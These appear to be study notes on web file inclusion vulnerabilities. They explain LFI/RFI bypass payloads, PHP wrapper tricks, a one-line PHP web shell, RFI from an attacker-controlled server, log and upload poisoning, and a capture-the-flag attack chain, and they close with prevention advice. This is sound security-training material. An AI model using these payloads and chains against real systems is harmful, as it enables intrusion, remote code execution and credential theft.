# Intro to File Inclusions 

**What LFI Is and Why It Exists**

Local File Inclusion arises when a web application uses user-supplied input to determine which file to load or include on a page. The vulnerability exists not in the inclusion mechanism itself, but in the absence of validation on what the user is allowed to supply. Templating patterns like `?page=about` or `?language=en` are extremely common, and developers often fail to sanitize the value before passing it to a file-loading function.

**How the PHP Examples Work**

The PHP `include()` example directly passes the raw GET parameter into `include()`. Any value the attacker supplies becomes the path PHP attempts to load. The same vulnerability applies to `include_once()`, `require()`, `require_once()`, and `file_get_contents()`. The key distinction in the function table is whether the function also executes PHP code in the loaded file - `include()` and `require()` both do, making them more dangerous than `file_get_contents()`, which only reads.

**How the NodeJS Examples Work**

The `fs.readFile()` example joins the user-supplied parameter onto a base directory path and reads the result. The `res.render()` example in Express.js is notable because the parameter comes from the URL path itself (e.g. `/about/en`), not a query string - attackers must recognize both patterns. `res.render()` also executes, unlike `fs.readFile()`.

**How the Java and .NET Examples Work**

Java's `<jsp:include>` reads but does not execute, while `<c:import>` executes and also supports remote URLs, making it the most dangerous Java variant. In .NET, `@Html.Partial()` only reads, but the `include` directive executes, and `@Html.RemotePartial()` can fetch remote content.

**Read vs Execute - Why It Matters**

This distinction drives the attacker's escalation path. A read-only function allows source code disclosure, credential leakage, and configuration exposure. An execute-capable function opens the door to remote code execution if the attacker can control or place content in a file the application then includes. Understanding which function is in use tells you exactly how far the vulnerability can be pushed during an assessment.

**Attack Chain Logic**

The typical chain is: identify a parameter controlling file path → confirm inclusion behavior → attempt path traversal to reach sensitive files → if execute-capable, attempt to escalate to RCE. Even read-only LFI is severe because leaked source code, keys, or credentials often enable full compromise through a secondary vector.


# Local File Inclusion (LFI) 

**Basic LFI**

When the `include()` function receives the raw GET parameter with no modification, supplying an absolute path like `/etc/passwd` works directly. The server fetches and renders the file content inline with the page. This is the simplest case and confirms the vulnerability exists.

**Path Traversal**

When a developer prepends a directory to the parameter (e.g. `"./languages/" . $_GET['language']`), an absolute path no longer works because it gets concatenated after the base directory, producing an invalid path. The fix is relative traversal using `../` sequences to walk up the directory tree until reaching root, then specifying the target file. Adding more `../` than necessary is harmless because traversing above root stays at root, so over-specifying is a safe default.

**Filename Prefix Bypass**

When a string prefix is concatenated before the parameter (e.g. `"lang_"`), a plain traversal sequence like `../../../etc/passwd` becomes `lang_../../../etc/passwd`, which is not a valid path. Prepending `/` to the payload causes the concatenated result to treat the prefix as a directory component that gets resolved away, allowing traversal to proceed. This technique is context-dependent and may fail if the constructed directory genuinely does not exist. It can also interfere with PHP wrapper and filter techniques covered in later sections.

**Appended Extensions**

When `.php` is appended server-side, every supplied path gets that extension added. Reading `/etc/passwd` becomes `/etc/passwd.php`, which does not exist. This requires dedicated bypass techniques covered in later sections.

**Second-Order Attacks**

These are indirect LFI attacks where the malicious payload is stored first (e.g. in a database as a username) and then triggered later when a separate application function uses that stored value to load a file. Developers often sanitize direct input but trust database-retrieved values, creating a blind spot. The attacker registers with a crafted username containing traversal sequences, then waits for a file-fetching function (like avatar loading) to consume that value and execute the inclusion.

**Attack Flow Summary**

The progression is: confirm raw absolute path inclusion works → if blocked, attempt traversal → if prefix exists, try leading `/` bypass → if extension appended, move to bypass techniques in later sections. Second-order attacks require mapping which application features consume stored user-controlled values and tracing them back to file-loading functions.


# Basic Bypasses 

**Non-Recursive Path Traversal Filters**

The `str_replace('../', '', ...)` filter is applied only once to the raw input. It does not loop and recheck the output after removal. Supplying `....//` exploits this: after the single-pass filter removes `../` from the middle, the remaining characters reassemble into `../`. The filter has effectively been tricked into producing the exact sequence it was trying to eliminate. Alternative bypass patterns like `..././` and `....\/` work on the same principle - nesting or splitting the traversal sequence so the filter's removal reconstructs a valid traversal.

**URL Encoding Bypass**

Some filters check for literal dot and slash characters. URL encoding replaces those characters with their percent-encoded equivalents (`%2e` for `.`, `%2f` for `/`), so the filter sees no banned characters. The web server decodes the URL before passing the value to `include()`, restoring the traversal path. Double encoding (encoding the already-encoded string again) can bypass filters that decode once and then check. Note that all dots must be encoded, not just the slashes, since some encoders leave dots unencoded.

**Approved Path Bypass**

A regex like `/^\.\/languages\/.+$/` requires the path to start with `./languages/`. This does not prevent traversal - it only enforces a prefix. Beginning the payload with `./languages/` satisfies the regex check, and the subsequent `../../../../` traversal then walks up to root and targets the desired file. The regex validates the start of the string but has no visibility into where the resolved path ultimately lands.

**Path Truncation (Legacy)**

In PHP versions before 5.3/5.4, strings were limited to 4096 characters. By padding the payload to exactly reach that limit with repeated `./` sequences, the server-appended `.php` extension falls beyond the boundary and gets silently dropped. The path must start with a non-existing directory to avoid early resolution. The shell command automates building the 4096-character string, making manual construction unnecessary.

**Null Byte Injection (Legacy)**

PHP before 5.5 passed strings to underlying C library functions that treat a null byte (`\0`, URL-encoded as `%00`) as the string terminator. Appending `%00` to the payload causes the C-level string to end there, so the `.php` appended by the PHP code is never seen by the filesystem call. This technique is entirely a function of how low-level memory handles strings and does not apply to modern PHP, which sanitizes null bytes before filesystem operations.

**Combining Techniques**

Approved path filters and non-recursive filters can both be active simultaneously. In that case, the payload must start with the approved prefix to pass the regex, and then use a non-recursive or encoded traversal sequence to defeat the secondary filter. Recognizing that multiple filters can stack is key to not giving up after a single bypass attempt fails.

# PHP Filters 

**What PHP Wrappers Are**

PHP wrappers are stream handlers accessible via URI-style schemes in PHP's file functions. The `php://` scheme exposes internal I/O streams. Because `include()` and similar functions accept any valid stream, an attacker with LFI control over the path argument can supply a wrapper URI instead of a plain file path. The server processes it as a legitimate PHP stream operation rather than a file read.

**Why Standard Inclusion Fails for Source Disclosure**

When a PHP file is included normally, PHP executes it. The source code is never seen - only its output (or nothing, if the file produces no HTML). To read the actual PHP source, the file must be processed in a way that bypasses execution. The `convert.base64-encode` conversion filter achieves this by encoding the raw file bytes before PHP has a chance to parse them as code.

**How the Base64 Filter Works**

The filter chain `php://filter/read=convert.base64-encode/resource=config` tells PHP to open `config` (resolved to `config.php` because the app appends the extension), pass its raw bytes through the base64 encoder, and return the encoded string to the output buffer. PHP never interprets the file as code. The result is a base64 string in the page response that the attacker decodes locally to recover the full source.

**Why This Matters for Extension-Appending Applications**

When an application appends `.php` to all input, the attacker is restricted to files with that extension. The base64 filter turns this restriction into an advantage - it means all reachable files are PHP source files, and the filter can extract all of them. The resource name is supplied without the extension because the application adds it automatically.

**Fuzzing Before Filter Use**

Before applying the filter to specific files, fuzzing with ffuf maps which PHP files exist on the server. Responses with codes 301, 302, and 403 should not be skipped - those files still exist and their source is still readable via the filter even if they redirect or block normal access. Once `index.php` source is obtained, it can be scanned for references to other PHP files, creating a recursive source disclosure path across the entire application.

**Operational Value**

Source code obtained this way reveals database credentials, API keys, session handling logic, other include calls (which may expose further LFI sinks), and custom sanitization code (which reveals exactly what bypasses will work). This phase is foundational before attempting RCE, as the source often reveals the precise path to escalation.


# PHP Wrappers 

**Prerequisite - allow_url_include**

Both the `data` and `input` wrappers require the `allow_url_include` directive to be set to `On` in the PHP configuration. This setting is off by default but is enabled on many production servers because certain plugins and frameworks depend on it. Before attempting either wrapper attack, confirming this setting by reading the PHP ini file through an existing LFI + base64 filter is essential, as the attack will silently fail if the setting is absent.

**data Wrapper Attack Chain**

The `data` wrapper lets PHP treat a URI as a file containing inline data. By specifying `text/plain;base64` as the MIME type, PHP accepts a base64 string and decodes it before processing. If that decoded content is PHP code, it gets executed by the include function. The attack chain is: encode a web shell to base64, URL-encode the base64 string (especially `+` and `=`), inject it via the language parameter with the `data://` scheme, and pass commands via a second GET parameter. The web shell `<?php system($_GET["cmd"]); ?>` becomes a fully interactive command interface this way.

**input Wrapper Attack Chain**

The `input` wrapper tells PHP to read the current request's POST body as if it were a file. The PHP code to execute is sent as the POST body, while the command to run is still passed as a GET parameter. This is useful when the `data` scheme is blocked but POST requests are accepted. If the vulnerable function only accepts POST (uses `$_POST` rather than `$_REQUEST`), the command itself must be hardcoded into the POST body rather than passed dynamically.

**expect Wrapper**

Unlike `data` and `input`, `expect` is not a built-in PHP wrapper - it is an external extension that must be explicitly installed and loaded. It provides a direct `expect://` URI scheme that executes shell commands without needing any web shell payload at all. The command is placed directly in the URI. Because it is external, it must be verified both in the ini file (checking for `extension=expect`) and via a live test request, since the extension could be listed but fail to load at runtime.

**Credential Enumeration as an Alternative**

Before reaching for wrappers, the simpler path is using LFI to read `config.php` for database credentials and checking `.ssh/id_rsa` in user home directories. Password reuse between database configs and system accounts is common and can give direct SSH access without needing code execution through wrappers at all.

**Attack Selection Logic**

Use the `data` wrapper when `allow_url_include=On` and GET requests are accepted. Use `input` when POST is available and `data` is blocked. Use `expect` only when the extension is confirmed loaded. For all three, the end result is arbitrary command execution on the back-end server under the web server's user context.

# Remote File Inclusion (RFI) 

**LFI vs RFI**

Every RFI-capable function is also LFI-capable, but not every LFI is exploitable as RFI. RFI requires the vulnerable function to support remote URL schemes, the attacker to control the full protocol prefix (not just a partial path), and `allow_url_include` to be enabled in PHP. Modern server defaults disable remote inclusion, so RFI is less common but significantly more powerful when found.

**Why Test with a Local URL First**

Before pointing the inclusion at an external attacker-controlled server, testing with `http://127.0.0.1:80/index.php` confirms RFI capability without triggering outbound firewall rules or network-level blocks. If that request resolves and renders content, the function accepts remote URLs and executes them. Only after this confirmation should an external payload server be stood up.

**HTTP Delivery**

The simplest delivery method is a Python HTTP server on the attacker machine. The shell.php file is fetched by the target server over HTTP, then executed by the include function. Listening on port 80 or 443 increases the chance of passing through egress firewall rules that block non-standard ports. If the target appends `.php` to the request automatically, the filename in the URL should omit the extension to avoid a double-extension failure.

**FTP Delivery**

FTP is useful when the `http://` scheme is blocked by a WAF or the HTTP port is firewalled. `pyftpdlib` provides an anonymous-access FTP server with a single command. PHP defaults to anonymous FTP login, so no credentials are needed unless the server enforces authentication, in which case credentials can be embedded directly in the `ftp://` URI.

**SMB Delivery - Windows Only**

On Windows targets, SMB-based RFI bypasses the `allow_url_include` requirement entirely because Windows resolves UNC paths natively at the OS level, treating remote SMB files as local filesystem objects. Impacket's `smbserver.py` provides an anonymous share from the current directory. The UNC path `\\<OUR_IP>\share\shell.php` is supplied directly to the vulnerable parameter. This technique is most reliable on the same network segment, as SMB traffic is commonly blocked at internet boundaries.

**SSRF via RFI**

Even when the vulnerable function does not execute remote files (e.g. `file_get_contents()`), RFI still enables SSRF. By pointing the inclusion at internal addresses and non-standard ports (`http://127.0.0.1:8080/`), the attacker can probe internal services not exposed to the public internet and retrieve their responses through the page output.

**Attack Flow**

Confirm `allow_url_include` via LFI and base64 filter - test local URL inclusion to verify RFI - create shell.php - choose delivery method based on firewall constraints (HTTP first, then FTP or SMB) - include remote shell and pass commands via GET parameter.


# LFI and File Uploads 

**Core Concept**

The upload form itself does not need to be vulnerable. The vulnerability is in the LFI function. As long as the LFI-capable function can execute code (see the functions table in section 1), any uploaded file whose content contains PHP code will be executed when included, regardless of its file extension. The file extension is irrelevant to PHP's execution decision - only the content matters once the file is passed to `include()` or `require()`.

**Malicious GIF Technique**

GIF magic bytes (`GIF8`) are plain ASCII, making them easy to prepend inline. A file beginning with `GIF8` followed by PHP code will pass basic image content-type checks while remaining fully executable by PHP's include function. After upload, the path to the stored file is retrieved from the page source or profile image URL, and that path is supplied directly to the LFI parameter. This is the most reliable of the three techniques because it requires no special PHP extensions.

**Zip Wrapper Technique**

The `zip://` wrapper allows PHP to access files inside a zip archive using a URI of the form `zip://archive.zip#internal_file`. By zipping a PHP web shell and uploading the zip renamed as a `.jpg`, the file may pass content-type validation. The `%23` in the URL is the URL-encoded `#` separator that tells the zip wrapper which internal file to load. This technique requires the zip wrapper to be enabled, which it is not by default.

**Phar Wrapper Technique**

The `phar://` wrapper accesses files inside a PHP Archive. The `shell.php` script uses the Phar API to create an archive (`shell.phar`) that contains a sub-file (`shell.txt`) holding the web shell code. After compilation, the archive is renamed to `shell.jpg` for upload. The `phar://` URI with `%2F` (URL-encoded `/`) separating the archive path from the sub-file name causes PHP to extract and execute `shell.txt` from within the archive. Like zip, this depends on the phar wrapper being available.

**Attack Selection Logic**

The malicious image method is the default first choice - it works across PHP, NodeJS, Java, and .NET as long as the function executes. The zip and phar methods are PHP-specific fallbacks for cases where the image method is blocked or the upload form rejects non-image content. Both wrapper methods have non-default extension requirements, so availability must be assumed and tested rather than guaranteed.

**Finding the Uploaded File Path**

After upload, inspect the page source - avatar or profile image tags will typically contain the server-side path. If the path is not visible, fuzz for common upload directories. The path is required to construct the LFI parameter value, and traversal sequences can be prepended if the LFI parameter has a directory prefix that must be escaped first.


# Log Poisoning 

**Core Principle**

Log poisoning exploits the fact that certain server-side files record attacker-controlled input verbatim. If that file can be included via LFI and the include function has execute privileges, any PHP code written into the log will be executed when the file is included. The attack has two phases: write PHP code into a logged field, then trigger execution by including the log through LFI.

**PHP Session Poisoning**

PHP session files are stored on disk with a filename derived from the `PHPSESSID` cookie value prefixed by `sess_`. If the web application reflects any user-controlled parameter into the session file (such as the `page` or `language` field), that field becomes the poison vector. The attacker first confirms which fields are reflected by submitting a recognizable test value and then reading the session file via LFI to observe it. Once a controllable field is confirmed, a URL-encoded PHP web shell is submitted as that parameter value, writing executable code into the session file. Including the session file then executes the shell. Because each subsequent page load overwrites the session with new values, the shell must be re-poisoned before each new command, unless a persistent web shell is written to disk during the first execution.

**Server Log Poisoning via User-Agent**

The HTTP `User-Agent` header is logged in `access.log` by both Apache and Nginx for every request to the server. Since the attacker fully controls request headers, injecting a PHP web shell as the User-Agent value causes it to be written into the log. The poisoning request does not need to be the LFI request itself - any request to the application will do. After poisoning, the log file is included through LFI and a `cmd` GET parameter triggers command execution. The curl method with a header file (`-H @Poison`) is cleaner than Burp for scripted or repeated poisoning. Log files can be large and slow to include; in production environments unnecessary inclusions should be avoided to prevent DoS.

**Read Permission Constraints**

Nginx logs are world-readable by default, making them immediately accessible to the `www-data` user running PHP. Apache logs are restricted to root or the `adm` group, so Apache log poisoning only works on misconfigured or older servers. If standard log paths are unreadable, `/proc/self/environ` and `/proc/self/fd/N` files also contain the User-Agent and may be readable depending on server configuration.

**Alternative Poison Sources**

Any service that logs attacker-controlled input and whose log is readable through LFI is a valid target. SSH login attempts log the username, FTP attempts log the username, and mail services log the message body or headers. Sending a connection or email with a PHP web shell as the username or subject causes it to be written into the respective log, which can then be included via LFI. The pattern is consistent: identify a controllable logged field, inject PHP code into it, include the log via LFI, execute commands.


# Automated Scanning 

**Why Fuzz for Parameters First**

HTML forms on a web application are typically tested by developers and better hardened. Hidden or undocumented GET parameters, which are not linked to any visible form, are frequently overlooked and left unsanitized. Fuzzing with a parameter name wordlist against a fixed test value reveals which parameters exist. Any discovered parameter can then be tested for LFI and other vulnerabilities. The `-fs` flag filters responses by size, removing the baseline non-match response so only meaningful hits appear.

**LFI Payload Fuzzing**

Once a vulnerable parameter is confirmed or suspected, running a comprehensive LFI wordlist like `LFI-Jhaddix.txt` against it tests a wide variety of traversal patterns, encodings, and bypass techniques in a single pass. The results will include payloads that succeed, which can then be manually verified and refined. This saves time over manually crafting each variant from scratch, though manual testing remains necessary for edge cases that wordlists do not cover.

**Webroot Fuzzing**

Knowing the absolute webroot path is required when relative paths cannot reach an uploads directory or when constructing absolute LFI payloads. Fuzzing with a default webroot wordlist and appending `/index.php` confirms the path when the included file returns a non-empty or differently-sized response. The identified webroot can then anchor all subsequent absolute path operations.

**Log and Config Fuzzing**

Log paths are required for log poisoning attacks. Config file paths expose the webroot, log directory variables, and other server details. The `LFI-Jhaddix.txt` wordlist covers many of these, but a dedicated Linux or Windows config wordlist returns more precise and complete results. Reading `apache2.conf` reveals the `DocumentRoot` and log path format, while `envvars` resolves global Apache variables like `APACHE_LOG_DIR` that are referenced symbolically in the config file. This two-step chain - config file first, then envvars - resolves the full log path even when it is not stored as a literal string.

**LFI Tools Caveat**

Automated LFI tools like LFISuite, LFiFreak, and liffy can speed up trivial cases but are not substitutes for manual testing. Most are unmaintained, depend on Python 2, and miss context-specific bypasses that require understanding the exact filter or configuration in place. They are useful for quick confirmation scans, not for thorough assessments or WAF-bypass scenarios.


# File Inclusion Prevention

**Eliminating User Input from Include Functions**

The most effective fix is architectural: no user-supplied value should ever reach a file-loading function directly. Instead, user input should act as a key that maps to a predefined file, using a whitelist implemented as a database lookup, a case-match script, or a static JSON map. The function receives only the whitelisted value, never the raw user input. This eliminates the vulnerability at the source rather than trying to filter around it.

**basename() for Directory Traversal Prevention**

PHP's `basename()` strips all path components and returns only the final filename. Even if a user supplies `../../../../etc/passwd`, `basename()` returns only `passwd`. The limitation is that it breaks any functionality requiring subdirectory navigation, so it is only suitable when the application only ever needs to load files from a single flat directory.

**Recursive Sanitization**

The `str_replace('../', '', ...)` approach demonstrated in earlier sections is non-recursive and bypassable with `....//`. The corrected version shown here wraps the replacement in a `while` loop that continues until no `../` substrings remain, closing the non-recursive bypass. This is more robust but still a secondary control - the whitelist approach is preferred.

**Bash vs PHP Wildcard Edge Case**

The `cat .?/.*/.?/etc/passwd` example demonstrates that Bash treats `?` and `*` as wildcards that can substitute for `.`, allowing traversal that looks nothing like `../`. PHP's native file functions do not share this behavior. However, if PHP is used to invoke Bash via `system()`, the attacker operates in the Bash context and the wildcard bypass becomes exploitable. This illustrates why using framework-native functions is safer than custom implementations - the community catches these edge cases over time.

**Web Server Configuration**

`allow_url_fopen` and `allow_url_include` set to `Off` eliminates RFI and the data/input wrapper attacks entirely. `open_basedir` restricts PHP's filesystem access to the specified directory tree, so even a confirmed LFI cannot reach files outside it. Disabling `expect` and `mod_userdir` removes two specific RCE vectors. Running the application in Docker provides OS-level isolation that `open_basedir` alone cannot guarantee.

**WAF as Defense-in-Depth**

ModSecurity in permissive mode logs what it would have blocked without disrupting traffic, allowing defenders to tune rules before enabling blocking mode. The value of a WAF is not making the system unhackable but in generating earlier and more distinctive signals when attacks occur. Hardening compresses the attacker's window of undetected activity - the average detection time without hardening was measured at 30 days. Hardened systems should still be actively monitored and periodically retested, especially after zero-days affect related frameworks.

# Skills Assessment - File Inclusion

**Reconnaissance Phase**

The assessment begins with directory and parameter enumeration. `feroxbuster` with a merged wordlist and PHP extension scanning reveals the application's structure: `contact.php`, `apply.php`, `/api/image.php`, and `/api/application.php`. The `/api/application.php` endpoint returns a 500 status, indicating it exists but requires specific input. The `contact.php` page becomes the primary target after parameter fuzzing reveals a `region` parameter that differs in response size from all other tested values.

**LFI Confirmation on image.php**

The `p` parameter on `image.php` is confirmed vulnerable via the non-recursive filter bypass (`....//` sequences). The filter strips `../` once, but the doubled sequence reconstructs a valid traversal after removal. Running the LFI wordlist against this endpoint confirms the bypass pattern and achieves `/etc/passwd` read.

**Source Code Disclosure via LFI**

With a working LFI payload on `image.php`, the `application.php` source is retrieved. The source reveals the file upload mechanism: files are stored at `../uploads/` with a filename derived from the MD5 hash of the uploaded file's content plus the original extension. This is the critical piece of information needed to locate the uploaded web shell after submission.

**Upload + LFI Chained Attack**

A malicious PHP web shell (or GIF-prefixed shell) is uploaded through the job application form on `apply.php`. Since `application.php` stores files as `<md5_of_content>.<ext>`, the upload path is predictable if the file content is known ahead of time. After uploading, the file path is constructed using the MD5 hash and included via the `region` parameter on `contact.php`.

**Double URL Encoding Bypass**

The `region` parameter on `contact.php` applies a filter that decodes URL encoding once and checks for traversal sequences. Double encoding (`%252E%252E%252F` decodes to `%2E%2E%2F` after the first pass, then to `../` at the filesystem level) bypasses the single-decode filter. The full path `%252E%252E%252Fuploads%252F<md5hash>` resolves to `../uploads/<md5hash>` after both decoding steps, pointing to the uploaded shell.

**RCE and Flag Retrieval**

With the shell included and the `cmd` GET parameter passed, arbitrary commands execute in the context of the web server. Listing `/` confirms the flag filename, and a subsequent `cat` retrieves the flag content. The full chain is: LFI on `image.php` to read source - source reveals upload path logic - upload shell via `apply.php` - double-encoded LFI on `contact.php` includes shell - command execution retrieves flag.


